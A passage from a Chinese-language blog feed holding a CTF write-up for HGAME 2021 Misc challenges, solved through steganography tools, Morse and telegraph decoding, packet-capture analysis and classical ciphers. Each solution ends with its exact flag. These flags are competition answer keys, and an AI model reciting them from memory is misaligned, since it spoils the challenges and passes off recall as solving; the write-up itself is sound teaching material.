flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397289611138.c9121599247804ee6de2f77321405b1b44827e15.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Wh4t_A_W0nderfu1_Wa11paper&#125;</span><br></pre></td></tr></table></figure><h3 id="Word-RE-MASTER"><a href="#Word-RE-MASTER" class="headerlink" title="Word RE:MASTER"></a>Word RE:MASTER</h3><p>解压得到两个 Word 文档，将 first.docx 解压，可以从 password.xml 中找到一段 BrainFuck 字符串。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+++++ +++[- &gt;++++ ++++&lt; ]&gt;+++ +.&lt;++ +[-&gt;+ ++&lt;]&gt; ++.&lt;+ ++[-&gt; +++&lt;] &gt;+.&lt;+ ++[-&gt; ---&lt;] &gt;-.++ ++++. &lt;+++[ -&gt;--- &lt;]&gt;-. +++.+ .++++ ++++. &lt;+++[ -&gt;--- &lt;]&gt;-- ----. +.--- --..+ .++++ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----- .&lt;</span><br></pre></td></tr></table></figure><p>可解得 maimai.docx 的密码 <code>DOYOUKNOWHIDDEN?</code>。打开 maimai.docx 后显示隐藏字符可得一串制表符和空格错落的内容。并且图片暗示<code>雪</code>，因此考虑 snow 隐写。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397290090528.e2f2c51101eb34efd17d2b3b440695b4cba5cff6.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">                              </span><br><span class="line">                                 </span><br><span class="line">                             </span><br><span class="line">                                    </span><br><span class="line">                                   </span><br><span class="line">                                         </span><br><span class="line">                                </span><br><span class="line">                                       </span><br><span class="line">                                          </span><br><span class="line">                        </span><br><span class="line">                        </span><br></pre></td></tr></table></figure><p>将以上字符保存为 html 文件并上传到服务器中获取链接，利用<a href="http://fog.misty.com/perry/ccs/snow/snow/snow.html">在线加解密工具</a>解密可以得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Cha11en9e_Whit3_P4ND0R4_P4R4D0XXX&#125;</span><br></pre></td></tr></table></figure><h3 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h3><p>在 Matryoshka.jpg 的文件备注中发现了 <code>!LyJJ9bi&amp;M7E72*JyD</code>，根据 F5 的暗示猜测其为 F5 隐写。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397290281286.29981c9d09e186d7d9ae09b75fb8f6487f330acc.png"></p><p>使用 F5 隐写工具提取出内容可得 <code>e@317S*p1A4bIYIs1M</code>。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397290528230.731ea50868a7a847acf6e194cbddb39e0ca0cb55.png" alt="image-20210207123441141"></p><p>将 <code>e@317S*p1A4bIYIs1M</code> 作为压缩包密码解压可得 01.jpg。根据暗示可知其经过了 steghide 隐写。在 01.jpg 的文件备注中发现了 <code>A7SL9nHRJXLh@$EbE8</code>，将其作为密码执行 steghide extract 之后得到了 pwd.txt。其中包含了 <code>u0!FO4JUhl5!L55%$&amp;</code>。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397290765999.712d328b969859426c837dec205e702f467e9517.png"></p><p>将其作为压缩包密码解压 Steghide.7z，得到 Outguess.7z 和 02.jpg。在图片的备注信息中可得 <code>z0GFieYAee%gdf0%lF</code>。将其作为密码执行 outguess 可得 <code>@UjXL93044V5zl2ZKI</code>。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397291060987.7db9c6685f0d53c12e15af7bce329a0edd205a9d.png"></p><p>将其作为压缩包密码解压 Outguess.7z 可得 03.jpg 和 JPHS.7z。图片文件的备注中可得 <code>rFQmRoT5lze@4X4^@0</code>。将其作为密码执行 JPHS 可解得 <code>xSRejK1^Z1Cp9M!z@H</code>。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397291463382.36ecab86fd98c24d729c10e3be95c426648ff0fe.png"></p><p>将其作为压缩包密码解压 JPHS.7z 可得 4.jpg。至此四片二维码切片集齐。用 Snipaste 简单拼一下图得到一个二维码。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397291707926.5ff886d610de5ccf011304a7f6c76618711ef793.png"></p><p>扫描二维码可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Taowa_is_N0T_g00d_but_T001s_is_Useful&#125;</span><br></pre></td></tr></table></figure><h3 id="Telegraph：1601-6639-3459-3134-0892"><a href="#Telegraph：1601-6639-3459-3134-0892" class="headerlink" title="Telegraph：1601 6639 3459 3134 0892"></a>Telegraph：1601 6639 3459 3134 0892</h3><p>将题目的 <code>1601 6639 3459 3134 0892</code> 使用中文电码解码可得到如下信息。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397291901884.c6bab1a317354791cb68dbc2278a19793a58555f.png"></p><p>使用 Audition 打开音频文件，可见如下提示。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397292249542.eeac6bdb8d0fb67cad56b57bf50c85deb687d345.png"></p><p>将 850Hz 处的内容提取出来，其中一段可见明显的摩斯电码。将其截取并抄收下来，可以得到如下内容。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397292617887.a7920858a88af068a3df8ff8be75188506669e96.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-.-- --- ..- .-. ..-. .-.. .- --. .. ... ---... ....- --. ----- ----- -.. ... ----- -. --. -... ..- - -. ----- - ....- --. ----- ----- -.. -- .- -. ----- ...-- ----. ...-- .---- ----- -.- ..</span><br></pre></td></tr></table></figure><p>使用摩斯电码解码可得到 flag。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YOURFLAGIS:4G00DS0NGBUTN0T4G00DMAN039310KI</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;4G00DS0NGBUTN0T4G00DMAN039310KI&#125;</span><br></pre></td></tr></table></figure><h3 id="Hallucigenia"><a href="#Hallucigenia" class="headerlink" title="Hallucigenia"></a>Hallucigenia</h3><p>Stegsolve 可解出图中有一个二维码。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397292823942.8a5738b9adbc70c9dc141fbd4e986bf6ea243afb.png@200w.png"></p><p>扫描之后可得如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gmBCrkRORUkAAAAA+jrgsWajaq0BeC3IQhCEIQhCKZw1MxTzSlNKnmJpivW9IHVPrTjvkkuI3sP7bWAEdIHWCbDsGsRkZ9IUJC9AhfZFbpqrmZBtI+ZvptWC&#x2F;KCPrL0gFeRPOcI2WyqjndfUWlNj+dgWpe1qSTEcdurXzMRAc5EihsEflmIN8RzuguWq61JWRQpSI51&#x2F;KHHT&#x2F;6&#x2F;ztPZJ33SSKbieTa1C5koONbLcf9aYmsVh7RW6p3SpASnUSb3JuSvpUBKxscbyBjiOpOTq8jcdRsx5&#x2F;IndXw3VgJV6iO1+6jl4gjVpWouViO6ih9ZmybSPkhaqyNUxVXpV5cYU+Xx5sQTfKystDLipmqaMhxIcgvplLqF&#x2F;LWZzIS5PvwbqOvrSlNHVEYchCEIQISICSZJijwu50rRQHDyUpaF0y&#x2F;&#x2F;&#x2F;p6FEDCCDFsuW7YFoVEFEST0BAACLgLOrAAAAAggUAAAAtAAAAFJESEkNAAAAChoKDUdOUIk&#x3D;</span><br></pre></td></tr></table></figure><p>很容易看出这是一张图片，使用 Cyberchef 经过 <code>From Base64 --&gt; Reverse --&gt; Render Image --&gt; Rotate Image --&gt; Flip Image</code> 之后可以得到如下图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397292993797.3de98ca72000ada1b944261d195a8eb09df8ff1e.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;lemonprefect.cn&#x2F;cb&#x2F;#recipe&#x3D;From_Base64(&#39;A-Za-z0-9%2B&#x2F;%3D&#39;,true)Reverse(&#39;Character&#39;)Render_Image(&#39;Raw&#39;)Rotate_Image(180)Flip_Image(&#39;Horizontal&#39;)&amp;input&#x3D;Z21CQ3JrUk9SVWtBQUFBQStqcmdzV2FqYXEwQmVDM0lRaENFSVFoQ0tadzFNeFR6U2xOS25tSnBpdlc5SUhWUHJUanZra3VJM3NQN2JXQUVkSUhXQ2JEc0dzUmtaOUlVSkM5QWhmWkZicHFybVpCdEkrWnZwdFdDL0tDUHJMMGdGZVJQT2NJMld5cWpuZGZVV2xOaitkZ1dwZTFxU1RFY2R1clh6TVJBYzVFaWhzRWZsbUlOOFJ6dWd1V3E2MUpXUlFwU0k1MS9LSEhULzYvenRQWkozM1NTS2JpZVRhMUM1a29PTmJMY2Y5YVltc1ZoN1JXNnAzU3BBU25VU2IzSnVTdnBVQkt4c2NieUJqaU9wT1RxOGpjZFJzeDUvSW5kWHczVmdKVjZpTzErNmpsNGdqVnBXb3VWaU82aWg5Wm15YlNQa2hhcXlOVXhWWHBWNWNZVStYeDVzUVRmS3lzdERMaXBtcWFNaHhJY2d2cGxMcUYvTFdaeklTNVB2d2JxT3ZyU2xOSFZFWWNoQ0VJUUlTSUNTWkppand1NTByUlFIRHlVcGFGMHkvLy9wNkZFRENDREZzdVc3WUZvVkVGRVNUMEJBQUNMZ0xPckFBQUFBZ2dVQUFBQXRBQUFBRkpFU0VrTkFBQUFDaG9LRFVkT1VJaz0</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;tenchi_souzou_dezain_bu&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag 转写成日文是“天地創造デザイン部”，谷歌翻译成中文是“天堂设计部”。</p></blockquote><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>使用 Wireshark 分析流量包，筛选 HTTP 条目可看到如下信息。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397293155011.989e138acd4b2fdd8db0dd70ebc3aa55d3f69f8e.png"></p><p>根据信息可知 SPF 是 txt 记录，同时在请求中可以看到请求域名是 flag.hgame2021.cf。使用 nslookup 查询这个域名的 txt 记录可得 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397293546586.acdc82654c77ee6425baa219b4222a44d05865e6.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;D0main_N4me_5ystem&#125;</span><br></pre></td></tr></table></figure><h3 id="A-R-K"><a href="#A-R-K" class="headerlink" title="A R K"></a>A R K</h3><p>Wireshark 分析流量包，跟踪 FTP 流量可得到如下 log。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613399386464.dcb47fe07ceed6f6d6ea23971438f9865d6f5826.png"></p><p>将 log 导入 Wireshark 后跟踪 TLS 流。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613399410855.92e454ce47a9efd61de1f8e25156c0c769916628.png"></p><p>根据提示着重观察 HTTP 请求 <code>/quest/getBattleReplay</code>，将其响应数据导出并解 GZIP 可得如下数据。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;battleReplay&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="attr">&quot;playerDataDelta&quot;</span>:&#123;<span class="attr">&quot;modified&quot;</span>:&#123;&#125;,<span class="attr">&quot;deleted&quot;</span>:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>其中 replay 的数据是一段 base64 编码，将其解码后可得一压缩包。修正其文件头为 <code>50 4B 03 04</code> 之后可以解压得到如下数据。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613400294020.b5ad967d3747e19900a851948dbd2e397263fbd8.png"></p><p>通过观察不难发现其中包含坐标数据，使用正则匹配将其取出后整理。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">regex = <span class="string">r&quot;&#123;\&quot;row\&quot;:(\d&#123;2&#125;),\&quot;col\&quot;:(\d&#123;2&#125;)&#125;&#125;&quot;</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;F:\\CTFs\\2021\\HGAME\\Misc\\A R K\\default_entry&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>)</span><br><span class="line">content = file.read()</span><br><span class="line">file.close()</span><br><span class="line">matches = re.findall(regex, content, re.MULTILINE)</span><br><span class="line"><span class="built_in">print</span>(matches)</span><br></pre></td></tr></table></figure><p>使用 Excel 画出坐标散点图。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613399763417.f841baa0b6c01f42c871bd01f3d4c507685fca84.png"></p><p>扫描二维码可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Did_y0u_ge7_Dusk?&#125;</span><br></pre></td></tr></table></figure><h3 id="A-R-C"><a href="#A-R-C" class="headerlink" title="A R C"></a>A R C</h3><p>将图片中内容抄取出来，得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BK0ICG]Qr*88_$gC,&#39;-j2+KH86?Q&quot;%928;LG@O*!Am0+&#96;;E7iV2agSE&lt;c&#39;U;6Yg^#H?!YBAQ]</span><br></pre></td></tr></table></figure><p>将其 base85 解码一次可得如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h8btxsWpHnJEj1aL5G3gBuMTKNPAwcF4fZodR9XQ7DSUVm2yCkr6zqiveY</span><br></pre></td></tr></table></figure><p>根据提示可知这是 BV 号和 AV 号转换的时候所用的 table。网上找个编码 BV 号的脚本并换一下表。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>bv2av<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>BV &lt;-&gt; AV<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;bv&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;BV&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;AV2bv()&quot;</span>&gt;</span>&lt;-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;bv2av()&quot;</span>&gt;</span>-&gt;<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;av&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;AV&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 作者：mcfx</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// 链接：https://www.zhihu.com/question/381784377/answer/1099438784</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// 来源：知乎</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">bv2av</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> bv = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;bv&#x27;</span>).value;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&#x27;av&#x27;</span>).value = dec(bv);</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">AV2bv</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> av = +<span class="built_in">document</span>.getElementById(<span class="string">&#x27;av&#x27;</span>).value;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&#x27;bv&#x27;</span>).value = enc(av);</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> table = <span class="string">&#x27;h8btxsWpHnJEj1aL5G3gBuMTKNPAwcF4fZodR9XQ7DSUVm2yCkr6zqiveY&#x27;</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> tr = &#123;&#125;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">58</span>; i++)</span></span><br><span class="line">            tr[table[i]] = i</span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> s = [<span class="number">11</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>]</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> xor = <span class="number">177451812</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> add = <span class="number">8728348608</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">dec</span>(<span class="params">x</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> r = <span class="number">0</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span></span><br><span class="line">                r += tr[x[s[i]]] * 58 ** i</span><br><span class="line">            &#125;</span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> (r - add) ^ xor</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">enc</span>(<span class="params">x</span>) </span>&#123;</span></span><br><span class="line">            x = (x ^ xor) + add</span><br><span class="line"><span class="javascript">            r = <span class="string">&#x27;BV1  4 1 7  &#x27;</span>.split(<span class="string">&#x27;&#x27;</span>)</span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span></span><br><span class="line"><span class="javascript">                r[s[i]] = table[<span class="built_in">parseInt</span>(x / <span class="number">58</span> ** i) % <span class="number">58</span>]</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> r.join(<span class="string">&#x27;&#x27;</span>)</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1614930816508.8dbb6f09919d7b898a935f195e07f7eb444516ea.png"></p><p>得到了 <code>BV17f411J77h</code>，将其作为密码解压 BVenc(10001540).7z。打开视频可以得到如下两段内容。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1614931302198.59bef60e3bd2489c98493476b8510366f87a15c8.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">What is The answer to live, the universe and everything?</span><br><span class="line"></span><br><span class="line">#)+F7IIMEH:?Injiikffi</span><br><span class="line">pwbvmpoakiscqdobil</span><br></pre></td></tr></table></figure><p>同时 Fragments.txt 中有如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">zB7&#x3D; ?I DEJ &gt;;H;&#96; 8KJ &#125; MH?J; ?J 8;97KI; OEK C7O D;;: CEH; MEH:I JE 7D7BOI?I M&gt;7J ;D9E:?D&#x3D; J&gt;; B?D;e ?Ib</span><br><span class="line">zEH B?D;f&#96; &quot;?A? &gt;7I JEB: OEK M&gt;7J ?J ?I&#96; 7D: uA?H7 ?I D;9;II7HO JE :E ?Jb</span><br><span class="line">*ME OEKD&#x3D; &#x3D;?HBI ;NFBEH; 7 I&gt;7JJ;H;: MEHB:&#96; &lt;?BB;: M?J&gt; IEKD:n 7 F7IJ JE 8; KD9EL;H;:bbb</span><br><span class="line">y79&gt; 7M7A;DI ?D J&gt;?I 8B7DA&#96; HK?Da:EJJ;: MEHB: JE :?I9EL;H J&gt;7J I&gt;; ?I ;GK7BBO 8B7DA&#96; H;C;C8;H?D&#x3D; DEJ&gt;?D&#x3D; E&lt; M&gt;7J 97C; 8;&lt;EH;b</span><br><span class="line">uD: J&gt;;D J&gt;;O C7A; 7 I;9ED: :?I9EL;HOn J&gt;; uH97;7&#96; CKBJ?JK:;I E&lt; &lt;BE7J?D&#x3D; &#x3D;B7IIaB?A; I&gt;7H:I 9EDJ7?D?D&#x3D; L?L?: C;CEH?;I E&lt; J&gt;; F7IJb</span><br></pre></td></tr></table></figure><p>视频中的问题的答案很明显是 42，因此将上述内容做 <code>ROT 42</code> 变换得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Flag is not here, but I write it because you may need more words to analysis what encoding the line1 is.</span><br><span class="line">For line2, Liki has told you what it is, and Akira is necessary to do it.</span><br><span class="line">Two young girls explore a shattered world, filled with sound: a past to be uncovered...</span><br><span class="line">Each awakens in this blank, ruin-dotted world to discover that she is equally blank, remembering nothing of what came before.</span><br><span class="line">And then they make a second discovery: the Arcaea, multitudes of floating glass-like shards containing vivid memories of the past.</span><br></pre></td></tr></table></figure><p>根据提示将视频中第二段的第一行做 <code>ROT 42</code> 变换得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MSUpasswordis:6557225</span><br></pre></td></tr></table></figure><p>根据搜索可以发现<a href="http://www.compression.ru/video/stego_video/index_en.html">插件</a>，在给出的软件中加载插件，打开视频后设置如下参数。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1614932436434.9e17251eefdf4db39761c4a7e426d03d13497739.png"></p><p>此时再渲染保存文件为 .avi 即可得到插件提取出的如下隐藏内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arc.hgame2021.cf</span><br><span class="line">Hikari</span><br><span class="line">Tairitsu</span><br></pre></td></tr></table></figure><p>将上述内容作为网址和用户名密码登录后可进入一个没什么信息的网站。此时回过头来发现提示信息中曾经提到过 Arcaea，因此猜测密文 <code>pwbvmpoakiscqdobil</code> 的解密内容跟这个音游相关。根据提示在 week1 Crypto 第一题的解密过程中找到了如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Vigenere-Liki</span><br><span class="line">Vigenere-Liki:&#125;VkmvJb!1XtAxe!hpM1&#123;M+9xqzrTM_Nj~cRg4x</span><br></pre></td></tr></table></figure><p>猜测使用的加密方法是 Vigenère，于是尝试使用 akira 作为 key 解密。得到了可读的内容 <code>pmtempestissimobyd</code>。将其拼接到网站路径中访问后即可得到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1614933099107.f6fbedecb5bf3678fd864560388c886334140e3c.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Y0u_Find_Pur3_Mem0ry&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW 大吉大利杯 2021</title>
      <link href="/zh-CN/posts/41fb5acf.html"/>
      <url>/zh-CN/posts/41fb5acf.html</url>
      
